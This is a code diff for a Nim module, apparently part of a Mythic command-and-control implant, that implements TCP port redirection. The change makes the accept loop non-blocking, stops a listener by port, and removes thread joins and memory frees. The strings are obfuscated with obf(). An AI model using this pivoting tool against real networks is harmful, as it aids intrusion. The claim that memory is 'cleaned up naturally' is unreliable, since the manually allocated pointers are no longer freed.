@@ -41,7 +41,7 @@ type
     sharedPtr: ptr RedirectListenerObj
 
 var
-  activeRedirectListeners {.threadvar.}: Table[string, RedirectListener]
+  activeRedirectListeners: Table[string, RedirectListener]
 
 proc forwardBidirectional(conn: ptr RedirectConnectionObj) {.thread.} =
   ## Thread that forwards data bidirectionally between client and remote
@@ -145,9 +145,12 @@ proc forwardBidirectional(conn: ptr RedirectConnectionObj) {.thread.} =
 
 proc acceptConnections(listener: ptr RedirectListenerObj) {.thread.} =
   ## Thread that accepts incoming connections and spawns forwarding threads
+  # Set listener socket to non-blocking mode for periodic active checks
+  listener[].listenerSocket.getFd().setBlocking(false)
+  
   while listener[].active:
     try:
-      # Accept incoming connection (blocking)
+      # Try to accept (non-blocking)
       var clientSocket: Socket
       listener[].listenerSocket.accept(clientSocket)
       
@@ -182,34 +185,49 @@ proc acceptConnections(listener: ptr RedirectListenerObj) {.thread.} =
       
       # Store connection
       listener[].connections.add(conn)
-      
+    except OSError:
+      # No pending connections (EWOULDBLOCK/EAGAIN on non-blocking socket)
+      # Sleep briefly and check active flag on next iteration
+      sleep(100)  # 100ms
     except:
-      # Accept error
+      # Other error
       if listener[].active:
         sleep(100)
+      else:
+        # Listener is shutting down, exit thread
+        break
 
 proc redirect*(taskId: string, params: JsonNode): JsonNode =
   ## Start/stop port redirect (direct TCP forwarding)
   let action = params[obf("action")].getStr("start")
   
   if action == obf("stop"):
-    # Stop existing listener
-    if activeRedirectListeners.hasKey(taskId):
-      let listener = activeRedirectListeners[taskId]
-      listener.active = false
-      listener.sharedPtr[].active = false
+    # Stop existing listener - find by port since each command has a different taskId
+    let port = params[obf("port")].getInt()
+    var foundListener: RedirectListener = nil
+    var foundTaskId: string = ""
+    
+    for tid, listener in activeRedirectListeners:
+      if listener.port == port:
+        foundListener = listener
+        foundTaskId = tid
+        break
+    
+    if foundListener != nil:
+      foundListener.active = false
+      foundListener.sharedPtr[].active = false
       
-      # Close listener socket
+      # Close listener socket first - this will cause accept() to fail immediately
       try:
-        listener.listenerSocket.close()
+        foundListener.listenerSocket.close()
       except:
         discard
       
-      # Wait for accept thread
-      joinThread(listener.acceptThread)
+      # Give accept thread time to detect failure and exit (checks every ~100ms)
+      sleep(250)
       
       # Close all connections
-      for conn in listener.connections:
+      for conn in foundListener.connections:
         conn.active = false
         conn.sharedPtr[].active = false
         try:
@@ -221,19 +239,16 @@ proc redirect*(taskId: string, params: JsonNode): JsonNode =
         except:
           discard
         
-        # Wait for forwarding thread
-        joinThread(conn.forwardThread)
-        
-        # Clean up memory
-        dealloc(conn.sharedPtr)
+        # Don't wait for forwarding thread - it will exit when sockets are closed
+        # Memory cleanup will happen naturally when thread exits
       
-      # Clean up listener
-      dealloc(listener.sharedPtr)
-      activeRedirectListeners.del(taskId)
+      # Clean up listener memory
+      # Note: sharedPtr and thread resources will be cleaned up when threads exit
+      activeRedirectListeners.del(foundTaskId)
       
-      return mythicSuccess(taskId, obf("Successfully stopped port redirect") & fmt" on port {listener.port}")
+      return mythicSuccess(taskId, obf("Successfully stopped port redirect") & fmt" on port {foundListener.port}")
     else:
-      return mythicError(taskId, obf("No active port redirect for this task"))
+      return mythicError(taskId, obf("No active port redirect found on port ") & $port)
   
   # Start new listener
   let port = params[obf("port")].getInt()
